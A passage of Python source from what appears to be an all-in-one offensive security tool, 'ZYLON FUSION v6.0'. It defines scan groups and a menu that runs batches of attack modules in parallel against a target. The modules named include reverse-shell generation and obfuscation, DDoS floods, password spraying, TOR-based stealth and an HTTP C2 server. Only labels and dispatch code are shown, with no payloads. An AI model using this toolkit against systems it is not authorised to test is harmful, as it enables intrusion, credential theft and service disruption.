            'scans': ['29', '167', '218', '219', '220', '230', '221'],
            'desc': 'All Subdomain Takeover — Check, Mass, CNAME, Service Verify'
        },
        'G8': {
            'name': 'CORS Attack',
            'icon': '🔓',
            'color': 'bold yellow',
            'scans': ['13', '222', '223', '224', '225', '231', '232', '226'],
            'desc': 'All CORS attacks — Origin Test, Null, Subdomain Bypass, CSRF Chain'
        },
        'G9': {
            'name': 'HTTP Smuggling',
            'icon': '🚢',
            'color': 'bold green',
            'scans': ['38', '93', '339', '340', '341', '342', '348', '349'],
            'desc': 'All HTTP Smuggling — CL.TE, TE.CL, H2C, H2.CL, Timing Analysis'
        },
        'G10': {
            'name': 'CRLF Injection',
            'icon': '↩️',
            'color': 'bold blue',
            'scans': ['15', '94', '182'],
            'desc': 'All CRLF Injection — Basic, Advanced, Wapiti CRLF'
        },
        'G11': {
            'name': 'Open Redirect',
            'icon': '➡️',
            'color': 'bold magenta',
            'scans': ['14', '95'],
            'desc': 'All Open Redirect — Detection and Advanced Scanning'
        },
        'G12': {
            'name': 'WAF Detection',
            'icon': '🛡️',
            'color': 'bold cyan',
            'scans': ['19', '52', '91', '357'],
            'desc': 'All WAF Detection — Fingerprinting, CDN Detection, Bypass Payloads'
        },
        'G13': {
            'name': 'WebSocket Attack',
            'icon': '🔌',
            'color': 'bold red',
            'scans': ['92', '334', '335', '336', '337', '338', '347', '351'],
            'desc': 'All WebSocket — Endpoint Discovery, Auth, Fuzzing, DoS, Replay'
        },
        'G14': {
            'name': 'Prototype Pollution',
            'icon': '☢️',
            'color': 'bold yellow',
            'scans': ['36', '343', '344', '345', '350', '352', '346'],
            'desc': 'All Prototype Pollution — Server-Side, Client-Side, DOM Clobber, Gadgets'
        },
        'G15': {
            'name': 'Cache Poisoning',
            'icon': '🧪',
            'color': 'bold green',
            'scans': ['37', '379', '380', '381', '382', '389', '390', '383'],
            'desc': 'All Cache Poisoning — Detection, Unkeyed Input, Header Poison, Deception'
        },
        'G16': {
            'name': 'JWT Attack',
            'icon': '🔑',
            'color': 'bold blue',
            'scans': ['40', '79', '80', '81', '82', '83'],
            'desc': 'All JWT attacks — Full Playbook, Key Confusion, alg:none, kid Inject, Crack'
        },
        'G17': {
            'name': 'Hash / Crypto',
            'icon': '🔐',
            'color': 'bold magenta',
            'scans': ['78', '265', '266', '267', '268', '269', '287', '288', '289', '290', '291', '292'],
            'desc': 'All Hash & Crypto — Identify, Crack, Batch, Online, Decode, XOR, Caesar'
        },
        'G18': {
            'name': 'NoSQL Injection',
            'icon': '🍃',
            'color': 'bold cyan',
            'scans': ['86', '87', '88', '270'],
            'desc': 'All NoSQL Injection — Detection, Auth Bypass, Blind Extraction, JSON Fuzz'
        },
        'G19': {
            'name': 'Cloud / Container Security',
            'icon': '☁️',
            'color': 'bold red',
            'scans': ['18', '89', '90', '204', '205', '206', '207', '211', '212'],
            'desc': 'All Cloud & Container — S3, Azure, GCP, Metadata, Docker, Escape'
        },
        'G20': {
            'name': 'Credential / Auth',
            'icon': '👤',
            'color': 'bold yellow',
            'scans': ['41', '214', '215', '216', '217', '227', '228', '229', '233'],
            'desc': 'All Credential & Auth — Password Spray, Stuffing, Username Enum, API Auth'
        },
        'G21': {
            'name': 'Parameter Mining',
            'icon': '⛏️',
            'color': 'bold green',
            'scans': ['24', '97', '98a', '256', '329'],
            'desc': 'All Parameter Mining — ParamSpider, Arjun, Fuzzing, Dalfox Params'
        },
        'G22': {
            'name': 'JS Analysis',
            'icon': '📜',
            'color': 'bold blue',
            'scans': ['17', '28', '98'],
            'desc': 'All JS Analysis — Sensitive Data, Deep Analysis, LinkFinder'
        },
        'G23': {
            'name': 'Git Exposure',
            'icon': '📦',
            'color': 'bold magenta',
            'scans': ['27', '243', '244', '245', '246', '251', '252'],
            'desc': 'All Git Exposure — Detection, Repo Dump, Dork, Secret Scan, Code Search'
        },
        'G24': {
            'name': 'Race Condition',
            'icon': '🏁',
            'color': 'bold cyan',
            'scans': ['35', '69', '70', '71', '327'],
            'desc': 'All Race Condition — Single, Multi-Endpoint, TOCTOU, Business Logic'
        },
        'G25': {
            'name': 'Dir / Fuzzing',
            'icon': '🗂️',
            'color': 'bold red',
            'scans': ['11', '178', '179', '180', '181', '254', '255', '259', '44'],
            'desc': 'All Dir & Fuzzing — Brute Force, Dirsearch, FFUF, API Endpoint, Recursive'
        },
        'G26': {
            'name': 'CMS Scanning',
            'icon': '🏗️',
            'color': 'bold yellow',
            'scans': ['12', '98c', '280', '281', '282', '283', '284', '285', '286'],
            'desc': 'All CMS Scanning — WordPress, Joomla, Drupal, Magento, Default Creds'
        },
        'G27': {
            'name': 'OSINT / Recon',
            'icon': '🕵️',
            'color': 'bold green',
            'scans': ['1', '2', '3', '26', '47', '170', '171', '172'],
            'desc': 'All OSINT & Recon — WHOIS, GeoIP, DNS, Google Dork, Email Harvest'
        },
        'G28': {
            'name': 'Session Security',
            'icon': '🍪',
            'color': 'bold blue',
            'scans': ['16', '194', '195', '196', '197'],
            'desc': 'All Session Security — Cookie Security, Flask Session, Fixation, Full Scan'
        },
        'G29': {
            'name': 'Command Injection',
            'icon': '💻',
            'color': 'bold magenta',
            'scans': ['61', '62', '63', '183', '236'],
            'desc': 'All Command Injection — Detection, OS Detect, Shell, Wapiti, OAST Blind'
        },
        'G30': {
            'name': 'Origin IP / CDN Bypass',
            'icon': '🎯',
            'color': 'bold cyan',
            'scans': ['50', '51', '52', '53', '54', '55'],
            'desc': 'All Origin IP & CDN — Quick Find, Full 22 Techniques, DNS History, Verify'
        },
        'G31': {
            'name': 'Deserialization',
            'icon': '🔄',
            'color': 'bold red',
            'scans': ['198', '199', '200', '201', '202', '203'],
            'desc': 'All Deserialization — Java, PHP, Python, Payload Gen, Blind, Full'
        },
        'G32': {
            'name': 'Mass Scanning',
            'icon': '🌐',
            'color': 'bold yellow',
            'scans': ['319', '320', '321', '322', '323', '330'],
            'desc': 'All Mass Scanning — Dork, SQLi, XSS, Multi-Vuln, File, Classification'
        },
        'G33': {
            'name': 'Mobile Security',
            'icon': '📱',
            'color': 'bold green',
            'scans': ['384', '385', '386', '387', '388', '391', '392'],
            'desc': 'All Mobile Security — API Test, SSL Pinning, Deep Links, WebView, APK'
        },
        'G34': {
            'name': 'AI Pentest',
            'icon': '🤖',
            'color': 'bold blue',
            'scans': ['294', '295', '296', '297', '298', '299', '312'],
            'desc': 'All AI Pentest — Target Analysis, Strategy, Payload Gen, Prioritization'
        },
        'G35': {
            'name': 'Stealth / Anonymity',
            'icon': '👻',
            'color': 'bold magenta',
            'scans': ['300', '301', '302', '303', '311'],
            'desc': 'All Stealth — TOR, Proxy Chain, Slow Mode, Identity Rotation'
        },
        'G36': {
            'name': 'XXE Attack',
            'icon': '📄',
            'color': 'bold cyan',
            'scans': ['33', '235'],
            'desc': 'All XXE attacks — Basic Detection, OAST Blind XXE'
        },
        'G37': {
            'name': 'GraphQL Attack',
            'icon': '◈',
            'color': 'bold red',
            'scans': ['72', '73', '74', '75', '76'],
            'desc': 'All GraphQL — Full Audit, Endpoint, Introspection, DoS, CSRF'
        },
        'G38': {
            'name': 'Business Logic',
            'icon': '💰',
            'color': 'bold yellow',
            'scans': ['324', '325', '326', '327', '328', '331', '332'],
            'desc': 'All Business Logic — Price, Payment, Privilege, Cart, Discount'
        },
        'G39': {
            'name': 'Payload / Exploit Dev',
            'icon': '💣',
            'color': 'bold green',
            'scans': ['354', '355', '356', '357', '358', '359', '360', '361', '362', '363'],
            'desc': 'All Payload & Exploit Dev — DB, Search, ROP, Shellcode, Format String'
        },
        'G40': {
            'name': 'Bounty Management',
            'icon': '🏆',
            'color': 'bold blue',
            'scans': ['374', '375', '376', '377', '378'],
            'desc': 'All Bounty Management — Programs, Classification, Reports, Scope'
        },
        'G41': {
            'name': 'Metadata / OPSEC',
            'icon': '📋',
            'color': 'bold magenta',
            'scans': ['365', '366', '367', '368', '369', '370'],
            'desc': 'All Metadata & OPSEC — EXIF, Document, Strip, OPSEC Check, Privacy'
        },
        'G42': {
            'name': 'Wordlist Generation',
            'icon': '📝',
            'color': 'bold cyan',
            'scans': ['305', '306', '307', '308', '309'],
            'desc': 'All Wordlist Gen — Target, Password, Subdomain, Username, Full'
        },
        'G43': {
            'name': 'DDoS Testing',
            'icon': '💥',
            'color': 'bold red',
            'scans': ['274', '275', '276', '277', '278', '279'],
            'desc': 'All DDoS Testing — HTTP Flood, Slowloris, TCP Flood, Rate Limit'
        },
        'G44': {
            'name': 'Dalfox XSS Engine',
            'icon': '🦊',
            'color': 'bold yellow',
            'scans': ['314', '315', '316', '317', '318', '329'],
            'desc': 'All Dalfox XSS — Quick, Mass, Blind, DOM, Full, Param Analysis'
        },
        'G45': {
            'name': 'Nuclei-Style Scanner',
            'icon': '🧬',
            'color': 'bold green',
            'scans': ['189', '190', '191', '192', '193'],
            'desc': 'All Nuclei-Style — Template, CVE, Exposed Panels, Default Creds'
        },
        'G46': {
            'name': 'Wapiti Scanner',
            'icon': '🕷️',
            'color': 'bold blue',
            'scans': ['174', '175', '176', '177', '182', '183'],
            'desc': 'All Wapiti — XSS, SQLi, SSRF, CRLF, Cmd Injection, Full Scan'
        },
        'G47': {
            'name': 'Dirsearch Engine',
            'icon': '📁',
            'color': 'bold magenta',
            'scans': ['178', '179', '180', '181'],
            'desc': 'All Dirsearch — Quick, Recursive, Extension, Deep Scan'
        },
        'G48': {
            'name': 'Crypto Advanced',
            'icon': '🔐',
            'color': 'bold cyan',
            'scans': ['287', '288', '289', '290', '291', '292'],
            'desc': 'All Crypto Advanced — Decode, Encoding Chain, XOR, Caesar, Frequency'
        },
        'G49': {
            'name': 'Shell Generation',
            'icon': '🐚',
            'color': 'bold red',
            'scans': ['261', '262', '263', '264', '271'],
            'desc': 'All Shell Gen — Reverse, Bind, Obfuscation, Staged Payload'
        },
        'G50': {
            'name': 'OAST / Callback',
            'icon': '📡',
            'color': 'bold yellow',
            'scans': ['234', '235', '236', '237', '238', '248'],
            'desc': 'All OAST Callback — Blind SSRF, XXE, Cmdi, XSS, Full, Server'
        },
        'G51': {
            'name': 'ReDoS / CSP',
            'icon': '🧶',
            'color': 'bold green',
            'scans': ['239', '240', '241', '249', '250', '242'],
            'desc': 'All ReDoS & CSP — Detection, Analysis, Bypass, Exploit Gen, XSS Test'
        },
        'G52': {
            'name': 'V3 Security (Advanced)',
            'icon': '🔐',
            'color': 'bold red',
            'scans': ['400', '401', '402', '403', '404', '405', '406', '407', '408', '409', '410', '411'],
            'desc': 'V3 Security Engine — GraphQL, DOM XSS, Cache Deception, Clickjacking, ATO, OAuth, HTTP Method, Blind XSS, 2FA, Mixed Content, Info Disclosure'
        },
        'G53': {
            'name': 'V4 Hunting',
            'icon': '🎯',
            'color': 'bold yellow',
            'scans': ['412', '413', '414', '415', '416', '417', '418', '419'],
            'desc': 'V4 Hunting — Username Enum, Email Security, CSRF, Framework, JS Libs, 403 Bypass, Cross-Domain, CVE Lookup'
        },
        'G54': {
            'name': 'V5 Async + C2',
            'icon': '⚡',
            'color': 'bold cyan',
            'scans': ['420', '421', '422', '423'],
            'desc': 'V5 Async Engine + HTTP C2 — Async Subdomain BF, Async Dir BF, AI Smart Scan, Phone Farm C2'
        },
        'G55': {
            'name': 'External Tools',
            'icon': '🔧',
            'color': 'bold white',
            'scans': ['424', '425', '426', '427'],
            'desc': 'External Tool Wrappers — Nuclei, SQLMap, Sublist3r, FFUF (must be installed separately)'
        },
    }

    # Scan ID to description mapping for group results
    SCAN_DESCRIPTIONS = {
        '0': 'Full Recon', '1': 'WHOIS', '2': 'Geo-IP', '3': 'DNS Records',
        '4': 'Subdomain Discovery', '5': 'Port Scanner', '6': 'Banner Grab',
        '7': 'Security Headers', '8': 'SSL/TLS', '9': 'SQLi Basic',
        '10': 'XSS Basic', '11': 'Dir Brute Force', '12': 'WordPress',
        '13': 'CORS Basic', '14': 'Open Redirect', '15': 'CRLF Basic',
        '16': 'Cookie Security', '17': 'JS Extractor', '18': 'Cloud Bucket',
        '19': 'WAF Detect', '20': 'Tech Stack', '21': 'Full Vuln',
        '22': 'Nuclear Scan', '23': 'Deep Crawl', '24': 'Param Miner',
        '25': 'Wayback URLs', '26': 'Google Dork', '27': 'GitHub Dork',
        '28': 'Deep JS', '29': 'Takeover Basic', '30': 'SSRF Basic',
        '31': 'SSTI Basic', '32': 'LFI/PathTrav', '33': 'XXE Basic',
        '34': 'IDOR', '35': 'Race Condition', '36': 'Prototype Pollution',
        '37': 'Cache Poison', '38': 'HTTP Smuggling', '39': 'Host Header',
        '40': 'JWT Basic', '41': 'Broken Auth', '42': 'Bounty Recon',
        '43': 'Bounty Vuln', '44': 'API Fuzzer', '45': 'Rate Limit',
        '46': 'Sensitive Files', '47': 'Email Enum', '48': 'Broken Links',
        '49': 'Tech CVE', '50': 'Origin IP Quick', '51': 'Origin IP Full',
        '52': 'CDN/WAF Detect', '53': 'DNS+CT IP', '54': 'Subdomain Resolve',
        '55': 'IP Verify', '56': 'Blind SQLi Detect', '57': 'Blind SQLi Schema',
        '58': 'Blind SQLi Meta', '59': 'Blind SQLi Data', '60': 'Blind SQLi Full',
        '61': 'Cmd Inject Detect', '62': 'Cmd Inject+OS', '63': 'Cmd Inject Shell',
        '64': 'SSRF Detect 5-Level', '65': 'SSRF Cloud Meta', '66': 'SSRF File Read',
        '67': 'SSRF Port Scan', '68': 'SSRF Network', '69': 'Race Single',
        '70': 'Race Multi', '71': 'Race TOCTOU', '72': 'GraphQL Full',
        '73': 'GraphQL Discover', '74': 'GraphQL Schema', '75': 'GraphQL DoS',
        '76': 'GraphQL CSRF', '77': 'Ciphey Decode', '78': 'Hash Identify',
        '79': 'JWT Full Playbook', '80': 'JWT Key Confusion', '81': 'JWT alg:none',
        '82': 'JWT kid Inject', '83': 'JWT Crack', '84': 'SSTI Detect 17+',
        '85': 'SSTI Exploit RCE', '86': 'NoSQL Detect', '87': 'NoSQL Auth Bypass',
        '88': 'NoSQL Blind Extract', '89': 'Container Security', '90': 'Container Escape',
        '91': 'WAF+Bypass Gen', '92': 'WebSocket Basic', '93': 'Smuggling CL.TE+TE.CL',
        '94': 'CRLF Advanced', '95': 'Open Redirect Adv', '96': '403 Bypass',
        '97': 'ParamSpider', '98': 'LinkFinder+Secret', '98a': 'Arjun',
        '98b': 'Ghauri SQLi', '98c': 'CMSeeK', '98d': 'Sherlock', '98e': 'Tehqeeq',
        '99': 'MEGA SCAN',
        '100': 'LFI Detect v5', '101': 'LFI Exploit v5', '102': 'LFI RCE v5',
        '103': 'XSS Reflected v5', '104': 'XSS DOM v5', '105': 'XSS Blind v5',
        '106': 'XSS Full v5', '107': 'Subdomain Passive v5', '108': 'Subdomain Brute v5',
        '109': 'Subdomain Full v5', '110': 'Hash ID v5', '111': 'Hash Crack v5',
        '112': 'Auto Decode v5', '113': 'Reverse Shell v5', '114': 'HoaxShell',
        '115': 'CMS Detect v5', '116': 'WP Scan v5', '117': 'CMS Full v5',
        '118': 'OSINT Email v5', '119': 'OSINT Dorks v5', '120': 'OSINT Full v5',
        '121': 'Cloud Meta v5', '122': 'Cloud S3 v5', '123': 'Cloud Gopherus',
        '124': 'Cloud Full v5', '125': 'CORS Misconfig v5', '126': 'Open Redirect v5',
        '127': 'XXE Detect v5', '128': 'XXE Extract v5', '129': 'XXE Deser v5',
        '130': 'SSTI Sandbox v5', '131': 'Proto Pollution v5', '132': 'CSP Analysis v5',
        '133': 'Cache Poison Adv v5', '134': 'Blind SQLi Headers', '135': 'Git Exposure v5',
        '136': 'Sensitive Files Adv', '137': 'GitHub Dork Adv', '138': 'OAST Callback',
        '139': 'ReDoS v5', '140': 'Password Spray v5', '141': 'Stealth v5',
        '142': 'Wordlist v5', '143': 'Adv Web Full',
        '144': 'SQLMap SQLi', '145': 'SQLi Exploit', '146': 'SQLi DIOS',
        '147': 'SQLi WAF Bypass', '148': 'XSStrike Reflected', '149': 'XSStrike DOM',
        '150': 'XSStrike Blind', '151': 'XSS Context-Aware', '152': 'XSS Full Adv',
        '153': 'SQLi Full',
        '154': 'LFI Adv Detect', '155': 'LFI PHP Wrapper', '156': 'LFI Log Poison',
        '157': 'LFI /proc/self', '158': 'LFI WAF Bypass', '159': 'LFI Auto Exploit',
        '160': 'Path Trav Detect', '161': 'Path Trav Config', '162': 'Path Trav Encode',
        '163': 'LFI+PathTrav Full',
        '164': 'Subdomain Passive Adv', '165': 'Subdomain Brute Adv',
        '166': 'Subdomain Cert Adv', '167': 'Takeover Adv 25+',
        '168': 'Subdomain Cloud Assets', '169': 'Subdomain Full Adv',
        '170': 'OSINT Email Adv', '171': 'OSINT Dorks Adv', '172': 'OSINT DNS Adv',
        '173': 'OSINT Full Adv',
        '174': 'Wapiti XSS', '175': 'Wapiti SQLi', '176': 'Wapiti SSRF',
        '177': 'Wapiti Full', '178': 'Dirsearch Quick', '179': 'Dirsearch Recursive',
        '180': 'Dirsearch Extension', '181': 'Dirsearch Deep',
        '182': 'Wapiti CRLF', '183': 'Wapiti CmdInj',
        '184': 'TPLmap SSTI Detect', '185': 'TPLmap Engine ID',
        '186': 'TPLmap Sandbox', '187': 'TPLmap Code Exec',
        '188': 'TPLmap Blind',
        '189': 'Nuclei Template', '190': 'Nuclei CVE', '191': 'Nuclei Panels',
        '192': 'Nuclei Default Creds', '193': 'Nuclei Full',
        '194': 'Flask Session', '195': 'Session Cookie', '196': 'Session Fixation',
        '197': 'Session Full',
        '198': 'Java Deser', '199': 'PHP Deser', '200': 'Python Deser',
        '201': 'Deser Payload Gen', '202': 'Blind Deser', '203': 'Deser Full',
        '204': 'Cloud S3 Adv', '205': 'Cloud Azure Adv', '206': 'Cloud GCP Adv',
        '207': 'Cloud Meta Adv', '208': 'Cloud Cred Adv', '209': 'Cloud Misconfig',
        '210': 'Cloud Full Adv', '211': 'Container Docker Adv',
        '212': 'Container Escape Adv', '213': 'Container Full Adv',
        '214': 'Password Spray', '215': 'Cred Stuffing', '216': 'Username Enum',
        '217': 'Auth Testing Full', '218': 'Takeover Adv 30+',
        '219': 'Takeover Mass', '220': 'Takeover CNAME', '221': 'Takeover Full',
        '222': 'CORS Origin', '223': 'CORS Null', '224': 'CORS Subdomain',
        '225': 'CORS Misconfig Adv', '226': 'CORS Full',
        '227': 'Password Spray Stealth', '228': 'API Auth', '229': 'HTTP Form Auth',
        '230': 'Takeover Service Verify', '231': 'CORS Cred', '232': 'CORS+CSRF Chain',
        '233': 'Credential Full',
        '234': 'OAST Blind SSRF', '235': 'OAST Blind XXE', '236': 'OAST Blind CmdI',
        '237': 'OAST Blind XSS', '238': 'OAST Full', '239': 'ReDoS Detect',
        '240': 'CSP Analysis', '241': 'CSP Bypass', '242': 'CSP+ReDoS Full',
        '243': 'Git Exposure Adv', '244': 'Git Repo Dump', '245': 'GitHub Dork Search',
        '246': 'SVN/HG/BZR', '247': 'Git Full Security', '248': 'OAST Server',
        '249': 'ReDoS Exploit Gen', '250': 'CSP XSS Bypass', '251': 'Git Secret Scan',
        '252': 'GitHub Code Search', '253': 'ReDoS+CSP+Git Combined',
        '254': 'FFUF Content Fuzz', '255': 'API Endpoint Fuzz', '256': 'Param Fuzz',
        '257': 'Header Fuzz', '258': 'VHost Discovery', '259': 'Recursive Fuzz',
        '260': 'Fuzzer Full', '261': 'Reverse Shell Gen', '262': 'Bind Shell Gen',
        '263': 'Shell Obfuscation', '264': 'Shell Payload Full',
        '265': 'Hash Identify Adv', '266': 'Hash Crack Adv', '267': 'Hash Batch',
        '268': 'Hash Online', '269': 'Hash Full',
        '270': 'API JSON Fuzz', '271': 'Staged Payload', '272': 'Password Candidate',
        '273': 'Fuzzer+Shell+Hash',
        '274': 'HTTP Flood', '275': 'Slowloris', '276': 'TCP Flood',
        '277': 'Rate Limit Adv', '278': 'DDoS Resilience', '279': 'DDoS Full',
        '280': 'CMS Detect Adv', '281': 'WP Deep', '282': 'Joomla Deep',
        '283': 'Drupal Deep', '284': 'Magento', '285': 'CMS Default Creds',
        '286': 'CMS Full Adv',
        '287': 'Auto Decode Adv', '288': 'Encoding Chain', '289': 'XOR Crack',
        '290': 'Caesar Crack', '291': 'Crypto Frequency', '292': 'Crypto Full',
        '293': 'DDoS+CMS+Crypto',
        '294': 'AI Target Analysis', '295': 'AI Attack Strategy',
        '296': 'AI Payload Gen', '297': 'AI Vuln Priority', '298': 'AI Report Gen',
        '299': 'AI Full', '300': 'Stealth Mode', '301': 'TOR Routed',
        '302': 'Proxy Chain', '303': 'Slow Mode', '304': 'Stealth Full',
        '305': 'Wordlist Target', '306': 'Wordlist Password',
        '307': 'Wordlist Subdomain', '308': 'Wordlist Username',
        '309': 'Wordlist Full',
        '310': 'AI+Stealth', '311': 'Stealth ID Rotation', '312': 'AI Interpret',
        '313': 'AI+Stealth+Wordlist',
        '314': 'Dalfox Quick', '315': 'Dalfox Mass', '316': 'Dalfox Blind',
        '317': 'Dalfox DOM', '318': 'Dalfox Full', '319': 'Mass Dork',
        '320': 'Mass SQLi', '321': 'Mass XSS', '322': 'Multi-Vuln',
        '323': 'Mass File', '324': 'BizLogic Price', '325': 'BizLogic Payment',
        '326': 'BizLogic Privilege', '327': 'BizLogic Race', '328': 'BizLogic Full',
        '329': 'Dalfox Params', '330': 'Mass Classify', '331': 'BizLogic Cart',
        '332': 'BizLogic Discount', '333': 'Mass+BizLogic',
        '334': 'WS Endpoint', '335': 'WS Auth', '336': 'WS Fuzzing',
        '337': 'WS Cross-Origin', '338': 'WS Full', '339': 'H2C Detect',
        '340': 'CL.TE Detect', '341': 'TE.CL Detect', '342': 'Smuggling Full',
        '343': 'Server-Side PP', '344': 'Client-Side PP', '345': 'DOM Clobber',
        '346': 'PP Full', '347': 'WS DoS', '348': 'H2.CL Detect',
        '349': 'Smuggling Timing', '350': 'PP Gadget Chains',
        '351': 'WS Replay', '352': 'PP JSON Body', '353': 'WS+H2C+PP',
        '354': 'Payload DB', '355': 'Payload Search', '356': 'GF Categorize',
        '357': 'WAF Bypass Payloads', '358': 'Payload Full DB',
        '359': 'Pattern Gen', '360': 'ROP Chain', '361': 'Shellcode Gen',
        '362': 'Format String', '363': 'Integer Overflow', '364': 'Exploit Dev Tools',
        '365': 'EXIF Extract', '366': 'Doc Metadata', '367': 'Metadata Strip',
        '368': 'OPSEC Check', '369': 'Privacy Risk', '370': 'Metadata Full',
        '371': 'Payload Import', '372': 'Payload Encode', '373': 'Payload+Exploit+Meta',
        '374': 'Bounty Program Mgmt', '375': 'Finding Classification',
        '376': 'Report Gen', '377': 'Scope Validation', '378': 'Bounty Full',
        '379': 'Cache Detect', '380': 'Cache Unkeyed', '381': 'Cache Header Poison',
        '382': 'Cache Deception', '383': 'Cache Poison Full',
        '384': 'Mobile API', '385': 'SSL Pinning', '386': 'Deep Links',
        '387': 'WebView Vulns', '388': 'Mobile Full',
        '389': 'Cache Param Cloak', '390': 'Cache Fat GET', '391': 'Cert Pinning',
        '392': 'APK Metadata', '393': 'Bounty+Cache+Mobile',
        # V3 Security Engine
        '400': 'V3 GraphQL', '401': 'V3 DOM XSS', '402': 'V3 Cache Deception',
        '403': 'V3 Clickjacking', '404': 'V3 Account Takeover', '405': 'V3 OAuth',
        '406': 'V3 HTTP Method', '407': 'V3 Blind XSS', '408': 'V3 2FA Bypass',
        '409': 'V3 Mixed Content', '410': 'V3 Info Disclosure', '411': 'V3 Full',
        # V4 Hunting Engine
        '412': 'V4 Username Enum', '413': 'V4 Email Security', '414': 'V4 CSRF',
        '415': 'V4 Framework', '416': 'V4 JS Libs', '417': 'V4 403 Bypass',
        '418': 'V4 Cross-Domain', '419': 'V4 CVE Lookup',
        # V5 Async Engine
        '420': 'V5 Subdomain BF', '421': 'V5 Dir BF', '422': 'V5 Smart Scan',
        # HTTP C2
        '423': 'HTTP C2 Server',
        # External Tools
        '424': 'Nuclei', '425': 'SQLMap Ext', '426': 'Sublist3r', '427': 'FFUF',
    }

    def group_menu(self):
        """Display the Group-Based Scanning menu"""
        while True:
            console.print(Panel(
                "[bold red]ZYLON FUSION v6.0 ULTIMATE[/bold red]\n"
                "[bold yellow]GROUP-BASED SCANNING MODE[/bold yellow]\n\n"
                f"[cyan]Target:[/cyan] {self.target or 'NOT SET'}\n"
                f"[cyan]Total Groups:[/cyan] 51 | [cyan]Total Scans:[/cyan] 355",
                title="[bold white] GROUP SCAN MODE [/bold white]",
                border_style="bright_red",
                box=box.HEAVY
            ))

            # Build group table - 3 columns for compact display
            group_table = Table(
                title="[bold yellow] Select a Group to Scan [/bold yellow]",
                box=box.DOUBLE,
                border_style="bright_magenta",
                show_lines=True
            )
            group_table.add_column("Group", style="bold cyan", width=6)
            group_table.add_column("Category", style="bold white", width=24)
            group_table.add_column("Scans", style="yellow", width=6, justify="center")
            group_table.add_column("Group", style="bold cyan", width=6)
            group_table.add_column("Category", style="bold white", width=24)
            group_table.add_column("Scans", style="yellow", width=6, justify="center")

            # Sort groups and display in 2-column layout
            sorted_groups = sorted(self.SCAN_GROUPS.items(), key=lambda x: int(x[0][1:]))
            half = (len(sorted_groups) + 1) // 2

            for i in range(half):
                row_data = []
                # Left column
                gid, ginfo = sorted_groups[i]
                row_data.append(f"{ginfo['icon']} {gid}")
                row_data.append(ginfo['name'])
                row_data.append(str(len(ginfo['scans'])))
                # Right column
                right_idx = i + half
                if right_idx < len(sorted_groups):
                    gid2, ginfo2 = sorted_groups[right_idx]
                    row_data.append(f"{ginfo2['icon']} {gid2}")
                    row_data.append(ginfo2['name'])
                    row_data.append(str(len(ginfo2['scans'])))
                else:
                    row_data.extend(['', '', ''])

                group_table.add_row(*row_data)

            console.print(group_table)

            # Special options
            console.print("\n[bold green]  [GALL]  RUN ALL GROUPS (355 scans) — PARALLEL[/bold green]")
            console.print("[bold cyan]  [G+G]  Multiple Groups (e.g. G1+G2+G5) — PARALLEL[/bold cyan]")
            console.print("[bold magenta]  [G1-S]  Run Group in SERIAL mode (safe, one-by-one)[/bold magenta]")
            console.print("[bold yellow]  [0]    Back to Main Menu[/bold yellow]")

            choice = Prompt.ask("\n[bold red]ZYLON GROUP[/bold red] [bold yellow]>[/bold yellow]").strip()

            if choice == '0':
                console.print("[bold yellow][*] Returning to main menu...[/bold yellow]")
                break
            elif choice.upper() == 'GALL':
                self._run_all_groups()
            elif '+' in choice.upper():
                # Multiple groups: G1+G2+G5
                self._run_multi_groups(choice.upper())
            elif choice.upper().endswith('-S'):
                # Serial mode: G1-S
                gid = choice.upper().replace('-S', '').strip()
                if gid in self.SCAN_GROUPS:
                    self._run_group_scan(gid, parallel_mode='serial')
                else:
                    console.print(f"[bold red][!] Invalid group: {gid}[/bold red]")
            elif choice.upper() in self.SCAN_GROUPS:
                self._run_group_scan(choice.upper(), parallel_mode='parallel')
            else:
                console.print(f"[bold red][!] Invalid group: {choice}[/bold red]")

    def _run_group_scan(self, group_id, parallel_mode='auto'):
        """Run all scans in a specific group — PARALLEL by default"""
        if not self.target:
            target = Prompt.ask("[bold yellow]Enter target domain/IP[/bold yellow]")
            success, msg = self.set_target(target)
            if not success:
                console.print(f"[bold red][!] {msg}[/bold red]")
                return
            console.print(f"[green][+] {msg}[/green]")

        ginfo = self.SCAN_GROUPS[group_id]
        scan_ids = ginfo['scans']
        total = len(scan_ids)

        # Determine parallel mode
        if parallel_mode == 'auto':
            # Auto: parallel if >3 scans, serial if <=3
            parallel_mode = 'parallel' if total > 3 else 'serial'

        # Show group header
        console.print(Panel(
            f"[{ginfo['color']}]{ginfo['icon']} {ginfo['name']}[/{ginfo['color']}]\n\n"
            f"[cyan]Target:[/cyan] {self.target}\n"
            f"[cyan]Total Scans:[/cyan] {total}\n"
            f"[cyan]Mode:[/cyan] {'PARALLEL (Fast)' if parallel_mode == 'parallel' else 'SERIAL (Safe)'}\n"
            f"[cyan]Description:[/cyan] {ginfo['desc']}\n\n"
            f"[bold yellow]Scans to run:[/bold yellow] {', '.join(['['+s+']' for s in scan_ids])}",
            title=f"[bold white] GROUP {group_id} [/bold white]",
            border_style="bright_green",
            box=box.HEAVY
        ))

        # Confirm
        confirm = Prompt.ask("[bold yellow]Start group scan? (y/n)[/bold yellow]", default="y")
        if confirm.lower() != 'y':
            console.print("[yellow][*] Group scan cancelled.[/yellow]")
            return

        # Run scans
        group_results = []
        start_time = time.time()

        if parallel_mode == 'parallel':
            # ========== PARALLEL MODE (FAST) ==========
            max_workers = min(total, 5)  # Max 5 concurrent scans (safe for Termux)
            console.print(f"[bold cyan][*] PARALLEL mode: {max_workers} workers | {total} scans[/bold cyan]")

            with Progress(
                SpinnerColumn(),
                TextColumn("[bold blue]{task.description}[/bold blue]"),
                BarColumn(bar_width=40),
                TextColumn("[bold yellow]{task.completed}/{task.total}[/bold yellow]"),
                console=console
            ) as progress:
                task = progress.add_task(f"[cyan]{ginfo['name']}[/cyan]", total=total)
                lock = threading.Lock()

                def _run_single_scan(scan_id):
                    """Run a single scan — thread-safe via per-thread results dict"""
                    scan_desc = self.SCAN_DESCRIPTIONS.get(scan_id, f'Scan {scan_id}')
                    scan_result = {
                        'scan_id': scan_id,
                        'scan_name': scan_desc,
                        'status': 'pending',
                        'findings': 0,
                        'error': None
                    }
                    try:
                        # Create per-thread results dict (NO shared state mutation)
                        thread_results = {'target': self.target, 'scan_type': scan_id,
                                         'timestamp': datetime.now().isoformat(), 'findings': {}}
                        # Execute scan under lock to prevent self.results races
                        # (scan methods all write to self.results)
                        with lock:
                            saved_results = self.results
                            self.results = thread_results
                            try:
                                scan_map = self._build_scan_map()
                                scan_func = scan_map.get(scan_id)
                                if scan_func:
                                    scan_func()
                                # Capture results while we still hold the lock
                                thread_results = dict(self.results)
                            finally:
                                self.results = saved_results
                        findings_count = len(thread_results.get('findings', {}))
